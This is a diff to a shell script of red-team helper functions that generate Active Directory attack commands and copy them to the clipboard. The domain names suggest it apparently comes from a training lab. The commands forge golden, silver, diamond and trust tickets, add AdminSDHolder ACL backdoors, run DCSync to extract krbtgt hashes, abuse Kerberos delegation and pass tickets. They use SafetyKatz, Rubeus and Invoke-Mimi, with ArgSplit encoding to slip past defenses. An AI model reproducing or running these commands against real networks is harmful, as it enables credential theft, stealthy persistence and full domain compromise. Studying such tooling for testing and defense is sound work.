@@ -43,7 +43,7 @@ nb-ad-pwsh-ea-krbtgt-hash         across trusts - child to parent using krbtgt h
 
 Domain Persistence
 ------------------
-nb-ad-pwsh-persist-acls        give user ACL rights
+nb-ad-pwsh-persist-acls        persistence through ACL rights
 nb-ad-pwsh-persist-golden      create a golden ticket
 nb-ad-pwsh-persist-silver      create a silver ticket
 nb-ad-pwsh-persist-diamond     create a diamond ticket
@@ -151,7 +151,7 @@ nb-ad-pwsh-persist-acls() {
           nb-vars-set-user
           echo
           __info "Command to add ${__USER} with FullControl privileges copied to clipboard:"
-          __COMMAND="Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,$dn' -PrincipalIdentity ${__USER} -Rights All -PrincipalDomain ${__DOMAIN} -TargetDomain dollarcorp.moneycorp.local -Verbose"
+          __COMMAND="Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,$dn' -PrincipalIdentity ${__USER} -Rights All -PrincipalDomain ${__DOMAIN} -TargetDomain ${__DOMAIN} -Verbose"
           echo "$__COMMAND" | wl-copy
           __ok "$__COMMAND"
           echo
@@ -209,7 +209,7 @@ nb-ad-pwsh-persist-diamond() {
     __check-hash
 
     echo
-    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
     __ok "diamond"
     echo
     __ask "Then check the encoded command with:"
@@ -242,7 +242,7 @@ nb-ad-pwsh-persist-silver() {
     __check-hash
 
     echo
-    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
     __ok "silver"
     echo
     __ask "Then check the encoded command with:"
@@ -275,7 +275,7 @@ nb-ad-pwsh-persist-golden() {
     __check-hash
 
     echo
-    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
     __ok "kerberos::golden"
     echo
     __ask "Then check the encoded command with:"
@@ -317,7 +317,7 @@ nb-ad-pwsh-ea-krbtgt-hash() {
     __check-hash
 
     echo
-    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
     __ok "golden"
     echo
     __ask "Then check the encoded command with:"
@@ -358,20 +358,20 @@ nb-ad-pwsh-ea-trust-tickets() {
     __check-hash
 
     echo
-    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
     __ok "kerberos::golden"
     echo
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
-    __COMMAND="C:\\\\AD\\\\Tools\\\\BetterSafetyKatz.exe -args \"%Pwn% /user:Administrator /domain:${__DOMAIN} /sid:${sid1} /sids:${sid2}-519 /rc4:${__HASH} /service:krbtgt /target:$dom /ticket:C:\AD\Tools\trust_tkt.kirbi\" \"exit\""
+    __COMMAND="C:\\\\AD\\\\Tools\\\\BetterSafetyKatz.exe -args \"%Pwn% /user:Administrator /domain:${__DOMAIN} /sid:${sid1} /sids:${sid2}-519 /rc4:${__HASH} /service:krbtgt /target:$dom /ticket:C:\\\\AD\\\\Tools\\\\trust_tkt.kirbi\" \"exit\""
 
     echo "$__COMMAND" | wl-copy
     echo
     __info "Command to Forge a ticket with SID History of Enterprise Admins copied to clipboard"
     __ok "$__COMMAND"
     echo
-    __warn "Now, encode the following command with: .\\ArgSplit.bat:"
+    __warn "Now, encode the following command with: .\\\\ArgSplit.bat:"
     __ok "asktgs"
     echo
     __ask "Then check the encoded command with:"
@@ -413,7 +413,7 @@ nb-ad-pwsh-rbcd() {
     __ask "Enter the AES256 hash of your machine"
     __check-hash
     echo
-    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __warn "Encode the following command with: .\\\\ArgSplit.bat:"
     __ok "s4u"
     echo
     __info "Now, abuse the RBCD to access target machine as Domain Administrator - Administrator"
@@ -428,7 +428,7 @@ nb-ad-pwsh-constrained-machine() {
     __info "Enumerate the computer accounts with constrained delegation enabled with command:"
     __ok "nb-ad-pwsh-enum-acls"
     echo
-    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
     __ok "s4u"
     echo
     __ask "Then check the encoded command with:"
@@ -457,7 +457,7 @@ nb-ad-pwsh-constrained-user() {
     __info "Enumerate users in the domain for whom Constrained Delegation is enabled with command:"
     __ok "nb-ad-pwsh-enum-acls"
     echo
-    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
     __ok "s4u"
     echo
     __ask "Then check the encoded command with:"
@@ -491,7 +491,7 @@ nb-ad-pwsh-unconstrained() {
     __info "You can check which machine allows for unconstrained delegation with command:"
     __ok "nb-ad-pwsh-enum-acls"
     echo
-    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
     __ok "monitor"
     echo
     __ask "Then check the encoded command with:"
@@ -639,20 +639,22 @@ nb-ad-pwsh-dcsync() {
     __ok "nb-ad-pwsh-enum-acls"
     echo
 
-    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
     __ok "lsadump::dcsync"
     echo
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
-    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\krbtgt\" \"exit\""
+    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\\\\krbtgt\" \"exit\""
 
     echo "$__COMMAND" | wl-copy
     echo
     __info "To dump all users, use flag /all, to specify a list of users use: /user:user1 /user:user2"
-    echo
-    __info "Command to run DCSync and extract krbtgt's hashes copied to clipboard:"
+    __info "Command to run DCSync and extract krbtgt's hashes:"
     __ok "$__COMMAND"
+    echo
+    __info "You can run DCSync with Invoke-Mimi.ps1:"
+    __ok "Invoke-Mimi -Command '\"lsadump::dcsync /user:tech\krbtgt\"'"
     echo
 }
 
@@ -684,30 +686,30 @@ nb-ad-pwsh-opth() {
     __check-hash
 
     echo
-    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
     __ok "asktgt"
     echo
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
-    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /domain:dollarcorp.moneycorp.local /user:${__USER} /aes256:${__HASH} /opsec /createnetonly:C:\\\\Windows\\\\System32\\\\cmd.exe /show /ptt"
+    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /domain:${__DOMAIN} /user:${__USER} /aes256:${__HASH} /opsec /createnetonly:C:\\\\Windows\\\\System32\\\\cmd.exe /show /ptt"
 
     echo "$__COMMAND" | wl-copy
     echo
-    __info "Command to run Over-pass-the-hash copied to clipboard:"
+    __info "Command to run Over pass-the-hash copied to clipboard:"
     __ok "$__COMMAND"
 }
 
 nb-ad-pwsh-ptt() {
     __check-project
 
-    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __warn "First encode the following command with: .\\\\ArgSplit.bat:"
     __ok "ptt"
     echo
     __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
-    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /ticket:"
+    __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /ticket:"
 
     echo "$__COMMAND" | wl-copy
     echo
@@ -837,11 +839,11 @@ nb-ad-pwsh-dump-secrets() {
 
     echo
     __warn "Load Invoke-Mimi with:"
-    __ok ". .\\Invoke-Mimi.ps1"
+    __ok ". .\\\\Invoke-Mimi.ps1"
     __ok "nb-pwsh-file-download    - Execute in memory"
 
     echo
-    __warn "If you're using SafetyKatz.exe, you need to encode the command with: .\\ArgSplit.bat for example:"
+    __warn "If you're using SafetyKatz.exe, you need to encode the command with: .\\\\ArgSplit.bat for example:"
     __ok "sekurlsa::ekeys"
     __ok "lsadump::lsa"
     __ok "lsadump::trust"
